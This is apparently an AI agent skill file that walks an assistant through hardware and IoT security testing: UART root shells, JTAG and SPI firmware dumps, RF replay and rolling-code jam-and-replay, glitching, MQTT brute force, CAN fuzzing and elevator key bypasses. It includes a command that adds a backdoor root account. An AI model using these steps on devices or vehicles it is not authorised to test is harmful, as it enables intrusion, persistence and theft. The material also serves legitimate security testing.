---
name: hardware-hacking
description: IoT pentesting, UART, JTAG, firmware extraction.
tags: [hardware, iot, uart, jtag, firmware, bus-pirate, logic-analyzer]
---

# Hardware Hacking

Use when user requests hardware security testing: IoT device hacking, UART/JTAG access, firmware extraction, or embedded system analysis.

## Trigger Conditions
- IoT device security testing
- UART/JTAG interface access
- Firmware extraction and analysis
- Hardware debugging
- Bus protocol analysis (SPI, I2C)
- Side-channel attacks
- Radio frequency (RF) hacking

## UART (Universal Asynchronous Receiver/Transmitter)

### Identify UART Pins
```
Common indicators:
- 3-4 pins grouped together
- Labeled: TX, RX, GND, VCC
- TX (Transmit) - sends data
- RX (Receive) - receives data
- GND (Ground) - common ground
- VCC (Power) - usually 3.3V or 5V

Finding pins with multimeter:
1. GND: continuity test to metal shielding
2. VCC: voltage test (should be 3.3V or 5V)
3. TX: voltage fluctuates during boot
4. RX: stays constant
```

### UART Connection
```bash
# Hardware needed:
# - USB-to-TTL adapter (FT232, CP2102, CH340)
# - Jumper wires

# Connections:
# Adapter TX -> Device RX
# Adapter RX -> Device TX
# Adapter GND -> Device GND
# (DO NOT connect VCC unless device needs power)

# Find baud rate (common: 9600, 115200)
# Try all common rates or use logic analyzer

# Connect with screen
screen /dev/ttyUSB0 115200

# Or minicom
minicom -D /dev/ttyUSB0 -b 115200

# Or picocom
picocom /dev/ttyUSB0 -b 115200
```

### Baud Rate Detection
```bash
# Install baudrate.py
git clone https://github.com/devttys0/baudrate
cd baudrate
python baudrate.py /dev/ttyUSB0

# Or use logic analyzer + PulseView
# Measure bit timing, calculate: baud = 1 / bit_time
```

### Exploit UART Access
```bash
# Often drops to root shell during boot
# Press Enter repeatedly during boot

# Common bootloader interrupts:
# U-Boot: press any key to stop autoboot
# Then: bootm, bootelf, or setenv bootargs

# Modify boot args
setenv bootargs "root=/dev/mtdblock2 console=ttyS0,115200 init=/bin/sh"
boot

# Mount filesystem read-write
mount -o remount,rw /

# Change root password
passwd root

# Add backdoor user
echo 'hacker:$1$hack$...:0:0:root:/root:/bin/sh' >> /etc/passwd
```

## JTAG (Joint Test Action Group)

### Identify JTAG Pins
```
Standard JTAG pins (usually 4-5):
- TDI (Test Data In)
- TDO (Test Data Out)
- TMS (Test Mode Select)
- TCK (Test Clock)
- TRST (Test Reset) - optional
- GND

Tools to identify pins:
- JTAGulator
- Bus Pirate
- Multimeter
```

### JTAGulator
```bash
# Connect JTAGulator to device
# All possible pins to target

# Run scan
> i  # Identify pins
Select voltage: 3.3V
Enter number of channels: 8
Enter pins: 0-7

# JTAG IDCODE scan
# Returns IDCODE if JTAG found

# Boundary scan
> b
# Maps all pins
```

### OpenOCD (JTAG Debugger)
```bash
# Install
apt install openocd

# Connect with Bus Pirate
openocd -f interface/buspirate.cfg -f target/stellaris.cfg

# Or with FTDI adapter
openocd -f interface/ftdi/um232h.cfg -f target/stm32f1x.cfg

# Telnet to OpenOCD
telnet localhost 4444

# Commands:
reset halt
reg  # Show registers
mdw 0x08000000 256  # Dump memory
flash read_bank 0 firmware.bin  # Dump firmware
```

## Firmware Extraction

### SPI Flash Extraction
```bash
# Tools:
# - Bus Pirate
# - CH341A programmer
# - Flashrom

# Identify SPI flash chip
# Usually 8-pin: 25Q32, 25Q64, 25Q128

# Using flashrom
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r firmware.bin

# Or CH341A
flashrom -p ch341a_spi -r firmware.bin

# Clone chip
flashrom -p ch341a_spi -r original.bin
flashrom -p ch341a_spi -w modified.bin
```

### EMMC Extraction
```bash
# EMMC has BGA package
# Options:
# 1. EMMC socket reader
# 2. Directly solder wires
# 3. Chip-off (remove chip, socket it)

# Read with EMMC reader
dd if=/dev/mmcblk0 of=emmc_dump.img bs=1M

# Or use specialized tools:
# - Easy JTAG Plus
# - Medusa Box
# - RIFF Box
```

### Firmware Analysis with Binwalk
```bash
# Install
apt install binwalk

# Scan firmware
binwalk firmware.bin

# Extract filesystem
binwalk -e firmware.bin

# Output shows:
# - Compression (gzip, LZMA)
# - Filesystems (SquashFS, JFFS2, UBIFS)
# - Bootloader
# - Kernel

# Manual extraction
dd if=firmware.bin of=filesystem.squashfs bs=1 skip=0x00040000 count=0x00800000
```

### Filesystem Extraction
```bash
# SquashFS
unsquashfs filesystem.squashfs
cd squashfs-root/

# JFFS2
jefferson filesystem.jffs2 -d jffs2_extracted/

# UBIFS
ubireader_extract_images -o ubi_extracted/ firmware.bin

# Analyze extracted files
find . -name "*.sh"  # Scripts
find . -name "*.conf"  # Configs
grep -r "password"  # Hardcoded creds
grep -r "192.168"  # IP addresses
```

## Bus Protocols

### I2C Sniffing
```bash
# Bus Pirate I2C mode
> m  # Mode
> 4  # I2C
> 2  # 50kHz

# Scan I2C bus
(1)  # Macro 1: I2C address scan

# Read from device
[0x50 r:16]  # Read 16 bytes from 0x50

# Write to device
[0x50 0x00 0xFF]  # Write 0xFF to register 0x00
```

### SPI Sniffing
```bash
# Bus Pirate SPI mode
> m
> 5  # SPI

# Configure
> 3  # 1MHz
> 1  # Clock polarity

# Sniff SPI traffic
> (2)  # Sniffer macro

# Read flash chip
[0x03 0x00 0x00 0x00 r:256]  # READ command
```

## Logic Analyzer

### Sigrok/PulseView
```bash
# Install
apt install sigrok pulseview

# Run
pulseview

# Capture:
1. Select device (Logic analyzer)
2. Set sample rate (1MHz+)
3. Add protocol decoders (UART, SPI, I2C)
4. Capture
5. Analyze decoded data
```

### Saleae Logic
```
Commercial tool, very user-friendly
Download from: https://www.saleae.com/

Features:
- High-speed capture
- Protocol analyzers
- Export to CSV/text
```

## RF (Radio Frequency) Hacking

### RTL-SDR (Software Defined Radio)
```bash
# Install
apt install rtl-sdr gqrx

# Find device
rtl_test

# Scan frequency range
rtl_power -f 300M:900M:1M -i 10 -g 50 scan.csv

# Visualize
gnuplot
plot "scan.csv" with lines

# Common frequencies:
# 315MHz - garage doors, car keys
# 433MHz - IoT devices
# 900MHz - older cordless phones
# 2.4GHz - WiFi, Bluetooth, IoT
```

### HackRF / Replay Attacks
```bash
# Record signal
hackrf_transfer -r signal.iq -f 433920000 -s 2000000

# Replay signal
hackrf_transfer -t signal.iq -f 433920000 -s 2000000 -x 40

# Analyze with Universal Radio Hacker
urh signal.iq
```

### Rolling Code Attacks
```bash
# Jam + Replay
# 1. Jam 315MHz while user presses remote
# 2. Capture signal
# 3. Stop jamming
# 4. User presses again (now code is used)
# 5. Replay first captured code (still valid)

# Tools:
# - HackRF
# - YardStick One
# - Flipper Zero
```

## Side-Channel Attacks

### Power Analysis
```bash
# Differential Power Analysis (DPA)
# Measure power consumption during crypto ops
# Extract keys from variations

# Tools:
# - ChipWhisperer
# - PicoScope

# Simple power glitching:
# Cut VCC briefly during auth check
# May skip security checks
```

### Fault Injection
```bash
# Clock glitching
# Send irregular clock signal
# Causes instruction skips

# Voltage glitching
# Brief voltage drop
# Corrupts operations

# ChipWhisperer script example:
import chipwhisperer as cw
scope = cw.scope()
scope.glitch.trigger_src = 'ext_single'
scope.glitch.output = 'clock_xor'
scope.glitch.width = 10
scope.glitch.offset = 20
# Trigger glitch during auth
```

## IoT Protocol Hacking

### MQTT
```bash
# Connect to MQTT broker
mosquitto_sub -h broker.example.com -t '#' -v

# Publish message
mosquitto_pub -h broker.example.com -t 'home/light' -m 'ON'

# Brute force auth
hydra -L users.txt -P passwords.txt mqtt://broker.example.com
```

### CoAP
```bash
# CoAP client
apt install libcoap-bin

# Discover resources
coap-client -m get coap://device.local/.well-known/core

# GET request
coap-client -m get coap://device.local/sensor/temp

# POST request
coap-client -m post coap://device.local/actuator/light -e "ON"
```

### Zigbee/Z-Wave
```bash
# Zigbee sniffing (requires Zigbee dongle)
apt install wireshark

# Capture with Wireshark
# Select Zigbee interface
# Decrypt with network key if known

# Killerbee (Zigbee toolkit)
pip install killerbee
zbstumbler  # Scan for Zigbee networks
zbdump -f zigbee.pcap  # Capture traffic
zbreplay -f zigbee.pcap  # Replay
```

## Automotive Hacking

### OBD-II / CAN Bus
```bash
# OBD-II adapter + can-utils
apt install can-utils

# Setup CAN interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# Dump CAN traffic
candump can0

# Send CAN message
cansend can0 123#DEADBEEF

# Fuzzing CAN
cansend can0 -I 500 -D r  # Random data

# ICSim (CAN simulator for practice)
git clone https://github.com/zombieCraig/ICSim
cd ICSim
./icsim vcan0 &
./controls vcan0
```

## Physical Security

### Lock Picking
```
Tools:
- Hook pick
- Rake pick
- Tension wrench

Basic technique:
1. Insert tension wrench in bottom of keyway
2. Apply light rotational pressure
3. Insert pick
4. Rake or single-pin pick
5. Feel for binding pins
6. Set pins one by one
```

### Elevator Hacking
```
Independent Service Mode:
- Used by firefighters
- Often: press and hold door close + floor button
- Or: specific key in panel

Bypasses:
- Many elevators use same default keys
- Keys available online (FEO-K1, etc.)
```

## Pitfalls
- **Bricking devices**: Wrong firmware = dead device
- **Voltage mismatch**: 5V to 3.3V device = damage
- **Warranty void**: Opening devices voids warranty
- **Legal**: Hacking devices you don't own is illegal
- **Radio laws**: Transmitting on licensed frequencies is illegal

## Related Skills
- `apk-modding-workflow`: Mobile firmware analysis
- `reverse-engineering-gokil`: Binary analysis
- `network-scanning-recon`: Find IoT devices on network
- `wireless-hacking`: WiFi-enabled IoT devices
